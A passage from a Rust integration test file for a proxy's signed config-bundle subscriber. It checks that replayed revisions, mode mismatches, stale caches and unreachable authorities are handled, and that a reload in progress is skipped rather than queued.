    assert!(serves("unresolved-candidate.test"));
}

/// WOR-2489 review: a dotted `${...}` placeholder (`${args.user_id}`)
/// is MCP local-tool interpolation vocabulary, not an env reference --
/// no POSIX environment variable name contains a dot. A bundle carrying
/// a `type: local` tool whose `http.url` uses one must be delivered,
/// not refused by the unresolved-reference gate the test above pins for
/// genuine `${VAR}` misses.
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_dotted_local_tool_placeholder_is_delivered_not_refused() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, stub) =
        applied_baseline(dir, "dotted-local.test", "dotted-authority.test").await;

    stub.serve(
        sign(
            6,
            BundleMode::Overlay,
            r#"
origins:
  "dotted-candidate.test":
    action:
      type: mcp
      mode: gateway
      server_info: {name: dotted-bundle-fixture, version: "1.0.0"}
      federated_servers:
        - type: local
          origin: local.internal
          prefix: dotted-local
          egress: {mode: enforce, hosts: [api.internal]}
          tools:
            - name: fetch
              description: dotted placeholder fixture
              input_schema: {type: object, properties: {}}
              http:
                method: GET
                url: "https://api.internal/items/${args.user_id}"
"#,
        )
        .to_json()
        .expect("encode"),
    );

    assert_eq!(
        subscriber.poll_once().await,
        CycleResult::Applied,
        "a dotted placeholder is not an unresolved env reference and must not refuse the bundle",
    );
    assert!(
        serves("dotted-candidate.test"),
        "the config-authority subscriber must deliver the local-tool origin",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_replayed_lower_revision_is_refused_after_a_restart() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (subscriber, stub) =
        applied_baseline(dir, "replay-local.test", "replay-authority.test").await;
    assert_eq!(subscriber.revision(), 5);
    drop(subscriber);

    // Simulate the restart: a brand-new subscriber that knows only what
    // is on disk.
    let keys = dir.join("authority-keys.json");
    let mut restarted = ConfigSubscriber::new(
        dir.join("sb.yml").to_str().expect("utf-8 path"),
        &upstream(&stub.url, BundleMode::Overlay, dir, &keys),
    )
    .expect("subscriber");
    assert_eq!(
        restarted.revision(),
        5,
        "the persisted cursor must survive a restart",
    );

    // An attacker (or a rolled-back authority) re-serves revision 4.
    let identity_before = pipeline_identity();
    let verify_failed_before = fetch_total("verify_failed");
    stub.serve(
        sign(
            4,
            BundleMode::Overlay,
            &bundle_payload("replay-candidate.test", "replayed"),
        )
        .to_json()
        .expect("encode"),
    );

    assert_eq!(restarted.poll_once().await, CycleResult::VerifyFailed);
    assert_eq!(fetch_total("verify_failed"), verify_failed_before + 1);
    assert_eq!(pipeline_identity(), identity_before, "no reload may happen");
    assert!(
        !serves("replay-candidate.test"),
        "a replayed revision must not reach the pipeline",
    );
    assert_eq!(restarted.revision(), 5);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn replace_mode_refuses_to_boot_without_a_cached_bundle() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let config_path = dir.join("sb.yml");
    let local = local_config("replace-local.test");
    std::fs::write(&config_path, &local).expect("write local config");
    let keys = write_keys(dir);
    let url = dead_url().await;

    let mut replace = ConfigSubscriber::new(
        config_path.to_str().expect("utf-8 path"),
        &upstream(&url, BundleMode::Replace, dir, &keys),
    )
    .expect("subscriber");
    let error = replace
        .boot_from_cache(&local)
        .expect_err("replace has nothing to serve without a bundle");
    let message = format!("{error:#}");
    assert!(message.contains("refusing to start"), "{message}");
    assert!(message.contains("mode: replace"), "{message}");
    assert!(
        message.contains("config-bundle.json"),
        "the operator needs to be told which file to seed: {message}",
    );

    // Overlay, same empty cache: boots on the local document instead.
    let mut overlay = ConfigSubscriber::new(
        config_path.to_str().expect("utf-8 path"),
        &upstream(&url, BundleMode::Overlay, dir, &keys),
    )
    .expect("subscriber");
    assert!(
        overlay
            .boot_from_cache(&local)
            .expect("overlay may boot without a bundle")
            .is_none(),
        "overlay must fall back to the local document, not a merged one",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_bundle_declaring_the_other_mode_is_refused() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let config_path = dir.join("sb.yml");
    let local = local_config("mode-local.test");
    std::fs::write(&config_path, &local).expect("write local config");
    let keys = write_keys(dir);

    let subscriber = ConfigSubscriber::new(
        config_path.to_str().expect("utf-8 path"),
        &upstream("https://authority.invalid", BundleMode::Overlay, dir, &keys),
    )
    .expect("subscriber");

    // A replace-intended payload applied as an overlay would keep keys
    // its author meant to drop, so the disagreement is refused rather
    // than resolved by guessing.
    let signed = sign(
        3,
        BundleMode::Replace,
        &bundle_payload("mode-candidate.test", "replace"),
    );
    assert_eq!(
        subscriber
            .evaluate(&signed, &local, now_unix_ms())
            .expect_err("a replace bundle must not apply as an overlay")
            .result,
        CycleResult::VerifyFailed,
    );

    // The same payload declared as an overlay is accepted by the pure
    // decision path.
    let signed = sign(
        3,
        BundleMode::Overlay,
        &bundle_payload("mode-candidate.test", "overlay"),
    );
    let candidate = subscriber
        .evaluate(&signed, &local, now_unix_ms())
        .expect("an overlay bundle is accepted");
    assert_eq!(candidate.revision(), 3);
    assert!(candidate.merged_yaml().contains("mode-candidate.test"));
    assert!(
        candidate.merged_yaml().contains("mode-local.test"),
        "an overlay keeps the local origins",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_stale_cache_is_not_used_at_boot() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let config_path = dir.join("sb.yml");
    let local = local_config("stale-local.test");
    std::fs::write(&config_path, &local).expect("write local config");
    let keys = write_keys(dir);

    // Received two days ago, against a one-day window.
    let signed = sign(
        4,
        BundleMode::Overlay,
        &bundle_payload("stale-authority.test", "stale"),
    );
    CachedBundle {
        received_at_unix_ms: now_unix_ms() - 2 * 86_400 * 1_000,
        bundle: signed,
    }
    .save(cache_path(dir))
    .expect("write cache");

    let url = dead_url().await;
    let mut overlay = ConfigSubscriber::new(
        config_path.to_str().expect("utf-8 path"),
        &upstream(&url, BundleMode::Overlay, dir, &keys),
    )
    .expect("subscriber");
    assert!(
        overlay
            .boot_from_cache(&local)
            .expect("overlay tolerates a stale cache")
            .is_none(),
        "a cache past max_staleness must not become the boot document",
    );

    let mut replace = ConfigSubscriber::new(
        config_path.to_str().expect("utf-8 path"),
        &upstream(&url, BundleMode::Replace, dir, &keys),
    )
    .expect("subscriber");
    let error = replace
        .boot_from_cache(&local)
        .expect_err("replace cannot serve a stale cache either");
    assert!(
        format!("{error:#}").contains("max_staleness"),
        "the refusal must name the window: {error:#}",
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn an_authority_error_status_is_treated_as_unreachable() {
    let _serial = SERIAL.lock().await;
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let config_path = dir.join("sb.yml");
    std::fs::write(&config_path, local_config("status-local.test")).expect("write local config");
    let keys = write_keys(dir);

    // The stub answers 200 with a body that is not a bundle, which is the
    // same class of failure as a 500: nothing usable arrived.
    let stub = StubAuthority::start(b"<html>gateway timeout</html>".to_vec()).await;
    let mut subscriber = ConfigSubscriber::new(
        config_path.to_str().expect("utf-8 path"),
        &upstream(&stub.url, BundleMode::Overlay, dir, &keys),
    )
    .expect("subscriber");

    let identity_before = pipeline_identity();
    let unreachable_before = fetch_total("unreachable");
    assert_eq!(subscriber.poll_once().await, CycleResult::Unreachable);
    assert_eq!(fetch_total("unreachable"), unreachable_before + 1);
    assert_eq!(pipeline_identity(), identity_before);
    assert_eq!(stub.requests(), 1);
    assert_eq!(subscriber.revision(), 0);
}

/// A cycle that finds another reload in flight is skipped, not queued
/// behind it, and the next cycle applies.
///
/// Deliberately not a `#[tokio::test]`: the reload lock is a
/// `std::sync::MutexGuard`, and holding one across an `await` inside an
/// async function is the pattern `clippy::await_holding_lock` exists to
/// stop. Driving the cycles through an explicit runtime keeps the guard on
/// a synchronous stack.
#[test]
fn a_cycle_that_finds_a_reload_in_flight_is_skipped_and_retried() {
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .worker_threads(2)
        .enable_all()
        .build()
        .expect("runtime");
    let _serial = runtime.block_on(SERIAL.lock());
    let temp = tempfile::tempdir().expect("temp dir");
    let dir = temp.path();
    let (mut subscriber, _stub) = runtime.block_on(ready_subscriber(
        dir,
        "busy-local.test",
        "busy-authority.test",
        5,
    ));

    let identity_before = pipeline_identity();
    let busy_before = fetch_total("reload_busy");
    let ring = HistoryRing::install(dir);

    // Another reload holds the lock for the whole prepare-and-publish
    // body; a poller must not wait behind it.
    let held = sbproxy_core::server::hold_config_reload_lock_for_test();
    let busy = runtime.block_on(subscriber.poll_once());
    drop(held);

    assert_eq!(busy, CycleResult::ReloadBusy);
    assert_eq!(fetch_total("reload_busy"), busy_before + 1);
    assert_eq!(
        pipeline_identity(),
        identity_before,
        "a skipped cycle must not swap the pipeline",
    );
    assert_eq!(
        subscriber.revision(),
        0,
        "a skipped cycle must not move the cursor",
    );
    assert!(
        !serves("busy-authority.test"),
        "a skipped cycle must not apply anything",
    );

    // WOR-2462: a skipped cycle is a deferral, not a refusal. Recording
    // it would put a row in `rejected/` on every poll interval of a
    // perfectly healthy node and bury the real refusals under it.
    assert!(
        ring.rejections().is_empty(),
        "a reload_busy skip must not be stored as a rejection: {:?}",
        ring.rejections(),
    );

    // The next interval retries against whatever the authority is serving
    // by then, with the lock free.
    assert_eq!(
        runtime.block_on(subscriber.poll_once()),
        CycleResult::Applied,
    );
    assert!(serves("busy-authority.test"));
    assert_eq!(subscriber.revision(), 5);

    // ... and the applied cycle did not put one there either.
    assert!(
        ring.rejections().is_empty(),
        "an applied cycle refuses nothing: {:?}",
        ring.rejections(),
    );
}
